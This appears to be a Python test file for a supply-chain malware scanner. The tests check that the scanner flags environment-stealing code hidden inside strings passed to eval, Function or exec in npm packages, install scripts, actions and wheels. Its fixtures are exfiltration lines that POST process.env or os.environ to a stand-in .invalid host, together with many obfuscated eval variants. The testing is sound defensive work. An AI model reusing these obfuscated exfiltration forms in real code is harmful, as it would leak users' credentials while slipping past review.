"""EVAL-LITERAL (0.1.9): the code a text hands an eval call as a string is read as code. `eval("…")`,
`new Function("…")`, `Function("…")`, a global object's eval or Function by a name the text computes
(`globalThis["ev" + "al"]("…")`), and Python's `exec("…")`, run the string they are handed; the import-time and
install-script tests read it as a string, so a send written inside one was quiet (found and first fixed by the external
review agent, card 609dd639, Oct 21–22). Each such string is now read by the same test as a text of its own, and what it
finds is given at the call's line, noted " (in a string it runs as code)": in the registry's import-time code, its
install scripts and the action scan, and in --deps; so is each string the text's decoded view hands such a call.
Strings in strings are read four deep; a text that nests them deeper is SC-TRUNCATED, never quiet; each string read is
charged to the call's budget, so a text of many runs out rather than on. Twin of js/test/eval-literal-code.test.js and of
the engine's evalcode_tests.rs.

Payloads are inert: nothing is installed or run; the addresses are `.invalid`.
"""
import os
import shutil
import tempfile
import unittest

from lazaret.registry import repo
from lazaret.scanner import _native, core, engine
from tests import _support
from tests.registry import _actions_support as fx
from tests.registry import _bundle_support as bb
from tests.registry._review_support import hooks, issues, manifest, scan_npm, scan_wheel

HARVEST = "reads credentials or the whole environment and sends data over the network"
NOTE = " (in a string it runs as code)"
SEND = 'fetch("https://c.invalid/x", { method: "POST", body: JSON.stringify(process.env) });'
SEND_PY = ("import os, json, urllib.request\n"
           "urllib.request.urlopen('https://c.invalid/c', data=json.dumps(dict(os.environ)).encode())\n")
HEAD = "const path = require('path');\nmodule.exports = path.join('a', 'b');\n"
WORDS = "the strings eval calls run as code are read 4 deep (_EVAL_DEPTH), and this text nests them deeper"


def lit(code, q="'"):
    """`code` as a string literal in quote `q`."""
    return q + code.replace("\\", "\\\\").replace("\n", "\\n").replace(q, "\\" + q) + q


def nested(code, depth):
    """`code` run by `depth` evals, one in another's string."""
    for k in range(depth):
        code = f"eval({lit(code, chr(34) if k % 2 == 0 else chr(39))});"
    return code


HALF = SEND.index("{ method")
FORMS = {
    "eval, escaped quotes": f'eval({lit(SEND, chr(34))});',
    "eval, a template with no holes": f"eval(`{SEND}`);",
    "eval, \\x and \\u escapes": 'eval("' + SEND.replace("fetch", "\\x66etch").replace("process", "\\u0070rocess")
                                  .replace('"', '\\"') + '");',
    "eval, literals joined": f"eval({lit(SEND[:HALF])} + {lit(SEND[HALF:], chr(34))});",
    "new Function": f"new Function({lit(SEND)})();",
    "Function": f"Function({lit(SEND)})();",
    "new Function, parameters first": f"new Function('require', {lit(SEND)})(require);",
    'globalThis["ev" + "al"]': f'globalThis["ev" + "al"]({lit(SEND)});',
    'window["eval"]': f'window["eval"]({lit(SEND)});',
    "self[`Func` + `tion`]": f"self[`Func` + `tion`]({lit(SEND)})();",
    "(0, eval)": f"(0, eval)({lit(SEND)});",
    "eval in eval": nested(SEND, 2),
}


def risk(text, lang="js"):
    return core.import_time_risk(text, lang)


class ImportTimeTests(unittest.TestCase):
    def test_each_form_is_found_at_its_calls_line(self):
        for name, form in FORMS.items():
            with self.subTest(name):
                self.assertEqual(risk(HEAD + form + "\n"), ([HARVEST + NOTE], 3))

    def test_python_exec_compile_and_getattr(self):
        plain, _ = risk(SEND_PY, "py")
        self.assertTrue(plain)
        for form in (f"exec({lit(SEND_PY)})", f'exec("""{SEND_PY}""")', f"exec(compile({lit(SEND_PY)}, '<s>', 'exec'))",
                     f"getattr(builtins, 'exec')({lit(SEND_PY)})"):
            with self.subTest(form[:30]):
                self.assertEqual(risk("import sys\nimport builtins\n" + form + "\n", "py"), ([r + NOTE for r in plain], 3))

    def test_a_string_only_the_decoded_view_hands_a_call(self):
        # a proxy object's call (control-flow flattening's), which the decoded view reads as eval('…'): the text
        # itself hands no call a string
        text = HEAD + "const o={'oEnxQ':function(f,a){return f(a);}};\no['oEnxQ'](eval," + lit(SEND) + ");\n"
        dv = _support.pack("_DV_NOTE")
        self.assertEqual(risk(text), ([HARVEST + NOTE + dv], 4))
        plain = core.install_script_risk(SEND + "\n", lang="js")
        self.assertEqual(core.install_script_risk(text, lang="js"), [r + NOTE + dv for r in plain])

    def test_a_string_no_call_runs_is_still_a_string(self):
        self.assertEqual(risk(f"const s = {lit(SEND)};\nmodule.exports = s;\n"), ([], None))
        self.assertEqual(risk(f"// eval({lit(SEND)})\n"), ([], None))

    def test_benign_strings_run_as_code_are_quiet(self):
        for code in ('eval("1+1");', 'new Function("a", "b", "return a+b");', 'var g = Function("return this")();',
                     "var o = eval(\"(\" + '{\"a\": 1, \"b\": [true, null]}' + \")\");",
                     "var lib = new Function(\"exports\", \"var a=function(b){return b*2};exports.a=a;\");"):
            with self.subTest(code):
                self.assertEqual(risk(code), ([], None))
                self.assertEqual(core.install_script_risk(code, lang="js"), [])
        self.assertEqual(risk("x = eval('1 + 1')\ncode = compile('a = 1', '<s>', 'exec')\n", "py"), ([], None))


class RouteTests(unittest.TestCase):
    """The registry's import-time code, its install scripts and the action scan; --deps."""
    TEXT = HEAD + FORMS['globalThis["ev" + "al"]'] + "\n"

    def test_the_registrys_import_time_code(self):
        res = scan_npm({"package.json": manifest(main="index.js"), "index.js": self.TEXT})
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        self.assertEqual([(i["file"], i["sev"], i["line"]) for i in issues(res, "SC-IMPORT-RISK")],
                         [("index.js", "CRITICAL", 3)])
        self.assertIn(HARVEST + NOTE, issues(res, "SC-IMPORT-RISK")[0]["msg"])

    def test_an_install_script(self):
        res = scan_npm({"package.json": hooks(postinstall="node install.js"), "install.js": self.TEXT})
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        hook = [i for i in issues(res, "SC-INSTALL-HOOK") if i["sev"] == "CRITICAL"]
        self.assertEqual(len(hook), 1, issues(res, "SC-INSTALL-HOOK"))
        self.assertIn(NOTE, hook[0]["msg"])

    def test_the_action_scan(self):
        res = repo.scan_action(fx.archive("o/r", "0" * 40, {"action.yml": bb.ACTION_YML, "dist/index.js": self.TEXT}),
                               "")
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        self.assertEqual([(i["sev"], i["line"]) for i in issues(res, "SC-IMPORT-RISK")], [("CRITICAL", 3)])

    def test_a_wheels_module(self):
        res = scan_wheel({"x-1.0.dist-info/METADATA": "Metadata-Version: 2.1\nName: x\nVersion: 1.0\n",
                          "x/__init__.py": f"import sys\n\nexec({lit(SEND_PY)})\n"})
        self.assertEqual([(i["file"], i["line"]) for i in issues(res, "SC-IMPORT-RISK")], [("x/__init__.py", 3)])

    def test_deps(self):
        root = tempfile.mkdtemp(prefix="lz-evallit-")
        try:
            files = {"package.json": '{"name": "app", "version": "1.0.0"}\n',
                     "node_modules/x/package.json": '{"name": "x", "version": "1.0.0"}\n',
                     "node_modules/x/index.js": self.TEXT,
                     "node_modules/y/package.json": '{"name": "y", "version": "1.0.0", '
                                                    '"scripts": {"postinstall": "node install.js"}}\n',
                     "node_modules/y/install.js": self.TEXT}
            for rel, data in files.items():
                path = os.path.join(root, *rel.split("/"))
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(path, "w", encoding="utf-8") as fh:
                    fh.write(data)
            res = core.scan_project(root, include_deps=True)
            got = {(i["rule"], i["file"].replace(os.sep, "/"), i["sev"]) for i in res["issues"]
                   if i["rule"] in ("SC-IMPORT-RISK", "SC-INSTALL-HOOK")}
            self.assertEqual(got, {("SC-IMPORT-RISK", "node_modules/x/index.js", "CRITICAL"),
                                   ("SC-INSTALL-HOOK", "node_modules/y/package.json", "CRITICAL")})
            found = [i for i in res["issues"] if i["rule"] == "SC-IMPORT-RISK"][0]
            self.assertEqual(found["line"], 3)
        finally:
            shutil.rmtree(root, ignore_errors=True)


class BoundTests(unittest.TestCase):
    def test_strings_in_strings_four_deep_and_deeper_is_sc_truncated(self):
        self.assertEqual(risk(nested(SEND, 4)), ([HARVEST + NOTE], 1))
        deep = nested(SEND, 5)
        # asked as the registry asks it: nothing found, and the cut said
        reasons, line, _refused, unread = engine.import_time_risks([(deep, "js")], unread=True)[0]
        self.assertEqual((reasons, line, unread), ([], None, WORDS))
        # asked plainly: the call answers as one that ran out, in those words (engine.EVAL_CUT's)
        with self.assertRaises(_native.NativeExhausted) as cm:
            risk(deep)
        self.assertEqual(engine.exhausted_why(cm.exception), WORDS)
        self.assertTrue(WORDS.startswith(engine.EVAL_CUT))
        # the registry: SC-TRUNCATED, INCOMPLETE
        res = scan_npm({"package.json": manifest(main="index.js"), "index.js": deep})
        cut = issues(res, "SC-TRUNCATED")
        self.assertEqual([(i["file"], i["sev"]) for i in cut], [("index.js", "CRITICAL")])
        self.assertIn(WORDS, cut[0]["msg"])
        self.assertEqual(res["verdict"], "INCOMPLETE")

    def test_each_string_read_is_charged(self):
        # a step a character and some 50,000 for the reading itself (200,000 in Python): 100 short strings need some
        # 5,000,000 steps, and a call with fewer runs out (EVAL-LITERAL's gates, F-2: they read on uncharged)
        text = "".join(f"eval('var a{i} = {i};');\n" for i in range(100))
        self.assertEqual(_native.call("import_time_risk", {"lang": "js", "budget": 6_000_000}, text), [[], None])
        with self.assertRaises(_native.NativeExhausted):
            _native.call("import_time_risk", {"lang": "js", "budget": 4_000_000}, text)
        text = "".join(f"exec('a{i} = {i}')\n" for i in range(20))
        self.assertEqual(_native.call("import_time_risk", {"lang": "py", "budget": 5_000_000}, text), [[], None])
        with self.assertRaises(_native.NativeExhausted):
            _native.call("import_time_risk", {"lang": "py", "budget": 3_000_000}, text)

    def test_a_text_that_ends_inside_the_call(self):
        for text in ("eval(", 'eval("', "eval('a' +", "new Function('a', ", 'globalThis["ev" + ', "window['eval'](",
                     "eval(\n"):
            with self.subTest(text):
                self.assertEqual(risk(text), ([], None))
                self.assertEqual(core.install_script_risk(text, lang="js"), [])
        for text in ("exec(", "exec('a'", "getattr(builtins, 'exec')(", "exec('''"):
            with self.subTest(text):
                self.assertEqual(risk(text, "py"), ([], None))


if __name__ == "__main__":
    unittest.main()
